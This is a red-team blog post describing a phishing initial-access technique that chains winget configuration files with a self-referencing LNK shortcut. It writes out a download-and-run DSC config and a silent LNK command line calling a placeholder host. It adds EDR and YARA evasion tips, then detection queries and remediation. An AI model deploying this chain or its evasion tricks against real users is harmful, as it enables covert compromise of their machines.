@@ -1,0 +1,508 @@
+# https://blog.compass-security.com/2026/03/winget-desired-state-initial-access-established/
+
+<!DOCTYPE html><html lang="en-US">
+
+<body class="wp-singular post-template-default single single-post postid-9964 single-format-standard wp-theme-hemingway wp-child-theme-compass_security wp-featherlight-captions">
+
+<div class="big-wrapper">
+
+    <div class="header-cover section bg-dark-light no-padding">
+
+         <!-- /header -->
+
+    </div> <!-- /bg-dark -->
+
+     <!-- /navigation -->
+<div class="wrapper section-inner">
+
+	<div class="content left">
+
+		
+			<div class="posts">
+
+				<div id="post-9964" class="post-9964 post type-post status-publish format-standard has-post-thumbnail hentry category-evasion category-red-teaming category-windows tag-initial-access tag-phishing">
+
+					<div class="post-header">
+
+						
+					    <h1 class="post-title"><a href="https://blog.compass-security.com/2026/03/winget-desired-state-initial-access-established/" rel="bookmark" title="WinGet Desired State: Initial Access Established">WinGet Desired State: Initial Access Established</a></h1>
+
+					    <div class="post-meta">
+
+							<span class="post-date"><a href="https://blog.compass-security.com/2026/03/winget-desired-state-initial-access-established/" title="WinGet Desired State: Initial Access Established">March 3, 2026</a></span>
+
+							<span class="date-sep"> / </span>
+
+							<span class="post-author"><a href="https://blog.compass-security.com/author/mtanner/" rel="author">Marc Tanner</a></span>
+
+							<span class="date-sep"> / </span>
+
+							<a href="https://blog.compass-security.com/2026/03/winget-desired-state-initial-access-established/#respond"><span class="comment">0 Comments</span></a>
+							
+						</div>
+
+					</div> <!-- /post-header -->
+
+					<div class="post-content">
+
+						
+<blockquote class="wp-block-quote is-layout-flow wp-block-quote-is-layout-flow">
+<p class="wp-block-paragraph">TL;DR: While not new, a self-referencing LNK file in combination with winget configuration instructions can be a viable initial access payload for environments where the Microsoft Store is not disabled.</p>
+</blockquote>
+
+
+
+<p class="wp-block-paragraph">When tasked to design a payload for an initial access scenario for a <a href="https://www.compass-security.com/en/services/red-teaming">red teaming project</a>, we typically look for inspiration in:</p>
+
+
+
+<ul class="wp-block-list">
+<li>Associated file extensions</li>
+
+
+
+<li>Registered protocol handlers</li>
+
+
+
+<li>Black lists used by popular applications such as <a href="https://learn.microsoft.com/en-us/deployedge/microsoft-edge-security-downloads-interruptions">Microsoft Edge</a> and <a href="https://support.microsoft.com/en-us/office/blocked-attachments-in-outlook-434752e1-02d3-4e90-9124-8b81e49a8519#ID0EFF">Outlook</a></li>
+
+
+
+<li>Known <a href="https://filesec.io/">abused file types</a> by threat actors</li>
+</ul>
+
+
+
+<p class="wp-block-paragraph">That is when my colleague Sylvain noticed the <code>.winget</code> extension mapped to the following command, allowing easy execution with a double click:</p>
+
+
+
+<pre class="wp-block-code"><code>winget.exe configure "%1" --wait</code></pre>
+
+
+
+<p class="wp-block-paragraph">While the <a href="https://www.zerosalarium.com/2024/12/LOLBIN%20WinGet%20execute%20PowerShell%20script.html">abuse potential of winget</a> is not new, it seems to be largely neglected by the defensive security community. This is also indicated by its absence from the aforementioned dangerous file block lists. A reason might be that the legitimate functionality is actively <a href="https://learn.microsoft.com/en-us/dotnet/core/tutorials/with-visual-studio-code?pivots=vscode#installation-instructions">promoted by Microsoft</a> to install e.g., developer dependencies in a streamlined way:</p>
+
+
+<div class="wp-block-image">
+<figure class="aligncenter size-large"><a href="https://blog.compass-security.com/wp-content/uploads/2026/02/winget-initial-access-ms-instructions.png" data-featherlight="image"><img fetchpriority="high" decoding="async" width="1024" height="410" src="https://blog.compass-security.com/wp-content/uploads/2026/02/winget-initial-access-ms-instructions-1024x410.png" alt="" class="wp-image-9966"></a><figcaption class="wp-element-caption"><a href="https://learn.microsoft.com/en-us/dotnet/core/tutorials/with-visual-studio-code?pivots=vscode#installation-instructions" data-type="link" data-id="https://learn.microsoft.com/en-us/dotnet/core/tutorials/with-visual-studio-code?pivots=vscode#installation-instructions">Microsoft instruction to install developer dependencies</a></figcaption></figure>
+</div>
+
+
+<p class="wp-block-paragraph">From an offensive security perspective it is convenient that the Mark of the Web (MoTW) is not taken into consideration and no <a href="https://learn.microsoft.com/en-us/windows/security/operating-system-security/virus-and-threat-protection/microsoft-defender-smartscreen/">SmartScreen</a> integration seems to exist.</p>
+
+
+
+<h2 class="wp-block-heading">Quick Introduction</h2>
+
+
+
+<p class="wp-block-paragraph">So what is the <a href="https://learn.microsoft.com/en-us/windows/package-manager/configuration/">winget configuration functionality</a>? It is built upon <a href="https://learn.microsoft.com/en-us/powershell/dsc/overview">(PowerShell) Desired State Configuration (DSC)</a> a declarative system configuration management platform. If you are familiar with Ansible, similar concepts apply where individual, ideally idempotent, configuration steps should result in a consistent system state.</p>
+
+
+
+<p class="wp-block-paragraph">The configure component requires extended features, which if needed, can be enabled from a low-privileged user context with:</p>
+
+
+
+<pre class="wp-block-code"><code>winget configure --enable</code></pre>
+
+
+
+<p class="wp-block-paragraph">The <a href="https://learn.microsoft.com/en-us/powershell/dsc/reference/psdscresources/overview?view=dsc-2.0#resources">default resources</a> facilitate access to environment variables and the registry, support archive extraction and process creation as well as PowerShell script execution. More than enough functionality to <a href="https://medium.com/@matterpreter/hang-fire-challenging-our-mental-model-of-initial-access-513c71878767">phish for persistence</a> using one of the <a href="https://www.hexacorn.com/blog/2017/01/28/beyond-good-ol-run-key-all-parts/">numerous techniques</a>. As a basic example the following configuration file downloads and runs Sysinternals’ Process Explorer:</p>
+
+
+
+<div class="enlighter-default enlighter-v-standard enlighter-t-enlighter enlighter-l-generic enlighter-linenumbers "><div class="enlighter-toolbar-top enlighter-toolbar"><div class="enlighter-btn enlighter-btn-raw"><div class="enlighter-tooltip">Plain text</div></div><div class="enlighter-btn enlighter-btn-copy"><div class="enlighter-tooltip">Copy to clipboard</div></div><div class="enlighter-btn enlighter-btn-window"><div class="enlighter-tooltip">Open code in new window</div></div><div class="enlighter-btn enlighter-btn-website"><div class="enlighter-tooltip">EnlighterJS 3 Syntax Highlighter</div></div></div><div class="enlighter-code"><div class="enlighter" style=""><div class=""><div><span class="enlighter-text">properties:</span></div></div><div class=""><div><span class="enlighter-text">  configurationVersion: </span><span class="enlighter-n0">0.2</span><span class="enlighter-text">.</span><span class="enlighter-m3">0</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">  resources:</span></div></div><div class=""><div><span class="enlighter-text">    - resource: PSDscResources/Script</span></div></div><div class=""><div><span class="enlighter-text">      directives:</span></div></div><div class=""><div><span class="enlighter-text">        description: Download ProcessExplorer.</span><span class="enlighter-m3">zip</span><span class="enlighter-text"> from remote URL</span></div></div><div class=""><div><span class="enlighter-text">      settings:</span></div></div><div class=""><div><span class="enlighter-text">        SetScript: </span><span class="enlighter-s0">"Invoke-WebRequest -Uri 'https://download.sysinternals.com/files/ProcessExplorer.zip' -OutFile 'C:\\Windows\\Temp\\ProcessExplorer.zip' -UseBasicParsing"</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">        GetScript: $</span><span class="enlighter-k1">false</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">        TestScript: $</span><span class="enlighter-k1">false</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    - resource: PSDscResources/Archive</span></div></div><div class=""><div><span class="enlighter-text">      directives:</span></div></div><div class=""><div><span class="enlighter-text">        description: Extract ProcessExplorer.</span><span class="enlighter-m3">zip</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">      settings:</span></div></div><div class=""><div><span class="enlighter-text">        Path: C:\Windows\Temp\ProcessExplorer.</span><span class="enlighter-m3">zip</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">        Destination: C:\Windows\Temp\Extracted</span></div></div><div class=""><div><span class="enlighter-text">        Ensure: Present</span></div></div><div class=""><div><span class="enlighter-text">    - resource: PSDscResources/WindowsProcess</span></div></div><div class=""><div><span class="enlighter-text">      directives:</span></div></div><div class=""><div><span class="enlighter-text">        description: Run ProcessExplorer.</span><span class="enlighter-m3">exe</span><span class="enlighter-text"> from extracted archive</span></div></div><div class=""><div><span class="enlighter-text">      settings:</span></div></div><div class=""><div><span class="enlighter-text">        Path: C:\Windows\Temp\Extracted\procexp64.</span><span class="enlighter-m3">exe</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">        Arguments: </span><span class="enlighter-s0">"-accepteula"</span></div></div></div><div class="enlighter-raw">properties:
+  configurationVersion: 0.2.0
+  resources:
+    - resource: PSDscResources/Script
+      directives:
+        description: Download ProcessExplorer.zip from remote URL
+      settings:
+        SetScript: "Invoke-WebRequest -Uri 'https://download.sysinternals.com/files/ProcessExplorer.zip' -OutFile 'C:\\Windows\\Temp\\ProcessExplorer.zip' -UseBasicParsing"
+        GetScript: $false
+        TestScript: $false
+    - resource: PSDscResources/Archive
+      directives:
+        description: Extract ProcessExplorer.zip
+      settings:
+        Path: C:\Windows\Temp\ProcessExplorer.zip
+        Destination: C:\Windows\Temp\Extracted
+        Ensure: Present
+    - resource: PSDscResources/WindowsProcess
+      directives:
+        description: Run ProcessExplorer.exe from extracted archive
+      settings:
+        Path: C:\Windows\Temp\Extracted\procexp64.exe
+        Arguments: "-accepteula"</div></div><div class="enlighter-toolbar-bottom enlighter-toolbar"></div></div><pre class="EnlighterJSRAW enlighter-origin" data-enlighter-language="generic" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">properties:
+  configurationVersion: 0.2.0
+  resources:
+    - resource: PSDscResources/Script
+      directives:
+        description: Download ProcessExplorer.zip from remote URL
+      settings:
+        SetScript: "Invoke-WebRequest -Uri 'https://download.sysinternals.com/files/ProcessExplorer.zip' -OutFile 'C:\\Windows\\Temp\\ProcessExplorer.zip' -UseBasicParsing"
+        GetScript: $false
+        TestScript: $false
+    - resource: PSDscResources/Archive
+      directives:
+        description: Extract ProcessExplorer.zip
+      settings:
+        Path: C:\Windows\Temp\ProcessExplorer.zip
+        Destination: C:\Windows\Temp\Extracted
+        Ensure: Present
+    - resource: PSDscResources/WindowsProcess
+      directives:
+        description: Run ProcessExplorer.exe from extracted archive
+      settings:
+        Path: C:\Windows\Temp\Extracted\procexp64.exe
+        Arguments: "-accepteula"</pre>
+
+
+
+<p class="wp-block-paragraph">From an offensive security perspective winget is a nice proxy for PowerShell execution using legitimate system functionality intended for configuration tasks. The underlying system changes are performed by the <code>ConfigurationRemotingServer.exe</code> process. This has some similarities to scripts being deployed using SCCM where they are executed through <code>CcmExec.exe</code> and often less scrutinized. If needed, all referenced PowerShell resources are automatically downloaded from the <a href="https://www.powershellgallery.com/packages?q=Tags%3A%22DSC%22">PowerShell Gallery</a> and stored in <code>%LOCALAPPDATA%\Microsoft\WinGet\Configuration\Modules</code>.</p>
+
+
+
+<p class="wp-block-paragraph">From an end-user point of view double clicking such a <code>.winget</code> file looks as follows:</p>
+
+
+<div class="wp-block-image">
+<figure class="aligncenter size-large"><a href="https://blog.compass-security.com/wp-content/uploads/2026/02/winget-double-click-confirmed2.png" data-featherlight="image"><img decoding="async" width="1024" height="966" src="https://blog.compass-security.com/wp-content/uploads/2026/02/winget-double-click-confirmed2-1024x966.png" alt="" class="wp-image-9967"></a><figcaption class="wp-element-caption">Standard behavior when opening a <code>.winget</code> file.</figcaption></figure>
+</div>
+
+
+<p class="wp-block-paragraph">When attempting to convince a phishing target to execute such a payload, there are a number of undesirable properties:</p>
+
+
+
+<ul class="wp-block-list">
+<li>The user has to explicitly confirm the installation by entering <code>Y</code> (or <code>y</code>, case does not matter)</li>
+
+
+
+<li>There is lots of confusing text being displayed</li>
+
+
+
+<li>Due to the <code>--wait</code> command line option, the console application remains open after execution</li>
+</ul>
+
+
+
+<h2 class="wp-block-heading">Reducing Required User Interaction</h2>
+
+
+
+<p class="wp-block-paragraph">Explicit user input can be avoided by either:</p>
+
+
+
+<ul class="wp-block-list">
+<li>Launching winget with the option <code>--accept-configuration-agreements</code></li>
+
+
+
+<li>Supplying the required confirmation input in some other form e.g., <code>echo y | winget ...</code></li>
+</ul>
+
+
+
+<p class="wp-block-paragraph">The output can be suppressed by redirecting it to <code>&gt;nul</code>.</p>
+
+
+
+<p class="wp-block-paragraph">All these options require direct control of the winget invocation which means the configuration file can no longer be used on its own, but needs to be applied through some trigger file. The most obvious approach is to use a LNK shortcut. This replaces the need for interactive keyboard input with an additional MoTW related security warning dialog which end users are hopefully more likely to accept. Because winget also applies configurations hosted on web servers, the first attempt was to use a shortcut executing:</p>
+
+
+
+<pre class="wp-block-code"><code>winget configure https://yourhost.tld/burpisnotbeef.yml --accept-configuration-agreements</code></pre>
+
+
+
+<p class="wp-block-paragraph">While the LNK contained within a ZIP archive could be delivered to the endpoint through HTML smuggling, subsequent execution failed.</p>
+
+
+
+<p class="wp-block-paragraph">At this point we decided to try a technique discussed by Emeric Nasi in his Offensive X talk <a href="https://www.youtube.com/watch?v=bA2p27gQK4M" data-type="link" data-id="https://www.youtube.com/watch?v=bA2p27gQK4M">Breach The Gate: Advanced Initial Access Craft 2024</a>:</p>
+
+
+<div class="wp-block-image">
+<figure class="aligncenter size-large"><a href="https://blog.compass-security.com/wp-content/uploads/2026/02/initial-access-lnk-self-referencing-scaled.png" data-featherlight="image"><img decoding="async" width="1024" height="576" src="https://blog.compass-security.com/wp-content/uploads/2026/02/initial-access-lnk-self-referencing-1024x576.png" alt="" class="wp-image-9968"></a><figcaption class="wp-element-caption">Self-referencing LNK, <a href="https://github.com/sevagas/Advanced_Initial_access_in_2024_OffensiveX/blob/main/breach_the_gates_extended.pdf">Slides</a></figcaption></figure>
+</div>
+
+
+<p class="wp-block-paragraph">The idea is to craft a LNK shortcut which:</p>
+
+
+
+<ol class="wp-block-list">
+<li>Locates itself</li>
+
+
+
+<li>Extracts the appended winget configuration data using <a href="https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/more"><code>more</code></a></li>
+
+
+
+<li>Shows a decoy document to distract the user</li>
+
+
+
+<li>Executes winget with the required options in the background</li>
+</ol>
+
+
+
+<p class="wp-block-paragraph">To locate the delivered LNK file, we assume that the user either extracted the ZIP archive in the downloads folder or simply opened the archive. In the latter case Windows extracts the selected file to a temporary directory such as: <code>%TMP%\2af79810-65c9-4d8d-8a63-5f003ab362c8_update.zip.2c8\update.lnk</code>.</p>
+
+
+
+<p class="wp-block-paragraph">Combining steps 1-4 from the above list, results in a shortcut like:</p>
+
+
+
+<pre class="wp-block-code"><code>C:\Windows\system32\cmd.exe /c "(cd %TMP%\*update.zip* || cd %HOMEPATH%\Downloads\update) &amp; (more +1349 *.lnk &gt; %TMP%\conf.yml) &amp;&amp; start https://yourhost.tld/decoy.pdf &amp; winget configure --enable &amp; (echo Y | winget configure -f %TMP%\conf.yml &gt;nul)"</code></pre>
+
+
+
+<p class="wp-block-paragraph">At this point I thought there is no chance that this would fly past a modern EDR.</p>
+
+
+<div class="wp-block-image">
+<figure class="aligncenter size-full"><a href="https://blog.compass-security.com/wp-content/uploads/2026/02/initial-access-meme-not-stupid.png" data-featherlight="image"><img loading="lazy" decoding="async" width="905" height="499" src="https://blog.compass-security.com/wp-content/uploads/2026/02/initial-access-meme-not-stupid.png" alt="" class="wp-image-9969"></a><figcaption class="wp-element-caption">Predicting how modern EDR systems react is hard</figcaption></figure>
+</div>
+
+
+<p class="wp-block-paragraph">For Microsoft Defender for Endpoint (MDE) it seems to be important that the size of the LNK file as a whole i.e., with the appended data is kept as small as possible. Otherwise alerts such as the one below are generated:</p>
+
+
+<div class="wp-block-image">
+<figure class="aligncenter size-full"><a href="https://blog.compass-security.com/wp-content/uploads/2026/02/initial-access-mde-alert-lnk.png" data-featherlight="image"><img loading="lazy" decoding="async" width="854" height="556" src="https://blog.compass-security.com/wp-content/uploads/2026/02/initial-access-mde-alert-lnk.png" alt="" class="wp-image-9970"></a><figcaption class="wp-element-caption">MDE does not seem to like large LNK files</figcaption></figure>
+</div>
+
+
+<p class="wp-block-paragraph">Some practical tips from my limited experience:</p>
+
+
+
+<ul class="wp-block-list">
+<li>Keep the shortcut command line as short as possible, do not exceed ~250 characters</li>
+
+
+
+<li>Instead of <code>winget configure</code> use the alias <code>winget dsc</code></li>
+
+
+
+<li>The file extension does not matter: instead of <code>.winget</code> just use <code>.yml</code> or omit it completely</li>
+
+
+
+<li>To speed up the configuration process use a single PowerShell script resource</li>
+
+
+
+<li>Use commands that map to compiled .NET cmdlets or use APIs such as <code>[System.IO.Compression.ZipFile]::ExtractToDirectory</code> instead of <code>Expand-Archive</code> to avoid the creation of an additional <code>powershell.exe</code> process</li>
+
+
+
+<li>Avoid double file extensions like <code>.pdf.lnk</code></li>
+
+
+
+<li>If you encounter an issue on system where extended features are not enabled, add a small delay using e.g. <code>timeout /t 1</code></li>
+
+
+
+<li>If you face a brittle detection on the <code>echo Y | ...</code> construct, use something else like <code>echo y &gt; x &amp; type x | ...</code> or apply slight <a href="https://services.google.com/fh/files/misc/exploring-the-depths-of-cmd-exe-obfuscation-wp-en.pdf">DOSfuscation</a></li>
+
+
+
+<li>Check that your payload does not match common <a href="https://github.com/Neo23x0/signature-base/blob/master/yara/gen_susp_lnk_files.yar">LNK related YARA rules</a></li>
+
+
+
+<li>Add more benign files in nested folder structures of the delivered ZIP file</li>
+
+
+
+<li>If you are using the standalone winget approach, pad the first 5 lines of your PowerShell script in the configuration file with comments matching your pre-text</li>
+</ul>
+
+
+
+<p class="wp-block-paragraph">The source code for the <a href="https://github.com/PowerShell/PSDscResources/blob/master/DscResources/MSFT_ScriptResource/MSFT_ScriptResource.psm1">legacy PowerShell script resource</a>, newer class-based <a href="https://github.com/microsoft/winget-dsc/tree/main/resources">DSC resources</a>, the core <a href="https://github.com/PowerShell/PSDesiredStateConfiguration">PSDesiredStateConfiguration module</a> as well as the <a href="https://github.com/microsoft/winget-cli/blob/HEAD/src/AppInstallerCLICore/Commands/ConfigureCommand.cpp">winget utility</a> itself is available on GitHub for further inspection. For example, revealing that <code>System.Management.Automation</code> is used for the PowerShell execution, meaning your script will be passed through AMSI.</p>
+
+
+
+<figure class="wp-block-video aligncenter"><video height="1080" style="aspect-ratio: 1920 / 1080; width: 1905px; height: 1071.56px;" width="1920" controls="" src="https://blog.compass-security.com/wp-content/uploads/2026/02/2026-02-24-18-27-58.mp4" data-origwidth="1920" data-origheight="1080"></video><figcaption class="wp-element-caption">End user experience on a system with extended features already enabled. The winget command runs in the background within a minimized console window.</figcaption></figure>
+
+
+
+<p class="wp-block-paragraph">This technique can also be combined with other <a href="https://www.wietzebeukema.nl/blog/trust-me-im-a-shortcut">LNK related tradecraft</a> to hide the executed commands from a curious user when inspecting the shortcut properties.</p>
+
+
+
+<h2 class="wp-block-heading">Detection</h2>
+
+
+
+<p class="wp-block-paragraph">To check whether the feature is (ab)used in your environment you can try to run the following KQL query which lists all winget configure invocations. It is important that the substring matching is performed case insensitively:</p>
+
+
+
+<pre class="wp-block-code"><code>DeviceProcessEvents
+| where FileName =~ "winget.exe"
+| where ProcessCommandLine has_any ("configure", "configuration", "dsc")</code></pre>
+
+
+
+<p class="wp-block-paragraph">On affected machines applied configurations and their origin can be listed with:</p>
+
+
+
+<pre class="wp-block-code"><code>winget configure list</code></pre>
+
+
+
+<p class="wp-block-paragraph">Furthermore, winget logs all performed invocations in a directory opened by <code>winget --logs</code>. By default the execution time and the used command line arguments are recorded. If the <a href="https://github.com/microsoft/winget-cli/blob/master/doc/Settings.md#logging">logging verbosity</a> is increased through the configuration file opened by <code>winget settings</code>, the complete configuration instructions and execution of individual steps are also logged.</p>
+
+
+
+<h2 class="wp-block-heading">Remediation</h2>
+
+
+
+<p class="wp-block-paragraph">Assuming the winget functionality is not needed at all, the attack surface can be mitigated by disabling the <a href="https://learn.microsoft.com/en-us/windows/configuration/store/">complete Microsoft Store</a> or more specifically the Windows Package Manager (winget) through the <a href="https://learn.microsoft.com/en-us/windows/client-management/mdm/policy-csp-desktopappinstaller#enableappinstaller"><code>EnableAppInstaller</code> policy</a>. General application whitelisting solutions such as Windows Defender Application Control (WDAC) provide another way to prevent execution.</p>
+
+
+
+<p class="wp-block-paragraph">If the Windows package manager is needed, the configuration sub command described in this blog can be individually disabled with the <a href="https://learn.microsoft.com/en-us/windows/client-management/mdm/policy-csp-desktopappinstaller#enablewindowspackagemanagerconfiguration"><code>EnableWindowsPackageManagerConfiguration</code></a> policy directive.</p>
+
+
+<div class="wp-block-image">
+<figure class="aligncenter size-large"><a href="https://blog.compass-security.com/wp-content/uploads/2026/02/winget-initial-access-remediation.png" data-featherlight="image"><img loading="lazy" decoding="async" width="1024" height="351" src="https://blog.compass-security.com/wp-content/uploads/2026/02/winget-initial-access-remediation-1024x351.png" alt="" class="wp-image-9973"></a><figcaption class="wp-element-caption">Different error modes depending on whether the store application, the package manager (winget) or its configuration feature is disabled.</figcaption></figure>
+</div>
+
+
+<p class="wp-block-paragraph">If for whatever reason this is not possible, then consider to at least remove the <code>.winget</code> file association. While this does not prevent the LNK shenanigans, it removes the possibility to execute configuration files by simple double clicking them, thereby increasing the required social engineering effort.</p>
+
+
+
+<h2 class="wp-block-heading">Conclusion</h2>
+
+
+
+<p class="wp-block-paragraph">We presented a viable initial access payload by chaining two known techniques: winget as a living off the land binary to invoke PowerShell scripts and self-referencing Windows shortcuts as a combined delivery and execution mechanism.</p>
+
+
+
+<p class="wp-block-paragraph">Whenever possible defenders should reduce the attack surface of their systems by disabling unused Windows components and features such as the Microsoft Store, the Windows Package Manager (winget) or its configuration feature.</p>
+
+						
+					</div> <!-- /post-content -->
+
+					<div class="clear"></div>
+
+					<div class="post-meta-bottom">
+
+						<p class="post-categories"><span class="category-icon"><span class="front-flap"></span></span> <a href="https://blog.compass-security.com/category/evasion/" rel="category tag">Evasion</a>, <a href="https://blog.compass-security.com/category/red-teaming/" rel="category tag">Red Teaming</a>, <a href="https://blog.compass-security.com/category/windows/" rel="category tag">Windows</a></p>
+
+						<p class="post-tags"><a href="https://blog.compass-security.com/tag/initial-access/" rel="tag">Initial Access</a><a href="https://blog.compass-security.com/tag/phishing/" rel="tag">phishing</a></p>
+						<div class="clear"></div>
+
+						<div class="post-nav">
+
+							
+								<a class="post-nav-older" title="Previous post: From Folder Deletion to Admin: Lenovo Vantage (CVE‑2025‑13154)" href="https://blog.compass-security.com/2026/02/from-folder-deletion-to-admin-lenovo-vantage-cve-2025-13154/">
+
+								<h5>Previous post</h5>
+								From Folder Deletion to Admin: Lenovo Vantage (CVE‑2025‑13154)
+								</a>
+
+							
+							
+								<a class="post-nav-newer" title="Next post: From Enumeration to Findings: The Security Findings Report in EntraFalcon" href="https://blog.compass-security.com/2026/03/from-enumeration-to-findings-the-security-findings-report-in-entrafalcon/">
+
+								<h5>Next post</h5>
+								From Enumeration to Findings: The Security Findings Report in EntraFalcon
+								</a>
+
+							
+							<div class="clear"></div>
+
+						</div> <!-- /post-nav -->
+
+					</div> <!-- /post-meta-bottom -->
+
+						<div id="respond" class="comment-respond">
+		<h3 id="reply-title" class="comment-reply-title">Leave a Reply <small><a rel="nofollow" id="cancel-comment-reply-link" href="https://blog.compass-security.com/2026/03/winget-desired-state-initial-access-established/#respond" style="display:none;">Cancel reply</a></small></h3><form action="https://blog.compass-security.com/wp-comments-post.php" method="post" id="commentform" class="comment-form"><p class="comment-notes"><span id="email-notes">Your email address will not be published.</span> <span class="required-field-message">Required fields are marked <span class="required">*</span></span></p><p class="comment-form-comment"><label for="comment">Comment <span class="required">*</span></label> <textarea id="comment" name="comment" cols="45" rows="8" maxlength="65525" required="required"></textarea></p><p class="comment-form-author"><label for="author">Name <span class="required">*</span></label> <input id="author" name="author" type="text" value="" size="30" maxlength="245" autocomplete="name" required="required"></p>
+<p class="comment-form-email"><label for="email">Email <span class="required">*</span></label> <input id="email" name="email" type="text" value="" size="30" maxlength="100" aria-describedby="email-notes" autocomplete="email" required="required"></p>
+<input id="honeypot-field-url" style="display: none;" autocomplete="off" name="url" type="text" value="" size="30" maxlength="200">
+<p class="form-submit"><input name="submit" type="submit" id="submit" class="submit" value="Post Comment"> 
+
+</p></form>	</div><!-- #respond -->
+	
+			   	
+			</div> <!-- /post -->
+
+		</div> <!-- /posts -->
+
+	</div> <!-- /content -->
+
+	
+	<!-- .sidebar -->
+	
+
+	<div class="clear"></div>
+
+</div> <!-- /wrapper -->
+
+ <!-- /footer -->
+
+<div class="credits section bg-dark no-padding">
+
+    <div class="credits-inner section-inner">
+
+        <p class="credits-left">
+
+            © 2026 <a href="https://blog.compass-security.com/" title="Compass Security Blog">Compass Security Blog</a>
+
+        </p>
+
+        <p class="credits-right">
+
+            <span><a title="To the top" class="tothetop">Up ↑</a>
+
+        </span></p>
+
+        <div class="clear"></div>
+
+    </div> <!-- /credits-inner -->
+
+</div> <!-- /credits -->
+
+</div> <!-- /big-wrapper -->
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</body></html><!--
+Performance optimized by Redis Object Cache. Learn more: https://wprediscache.com
+
+Retrieved 1782 objects (514 KB) from Redis using PhpRedis (v6.3.0).
+-->
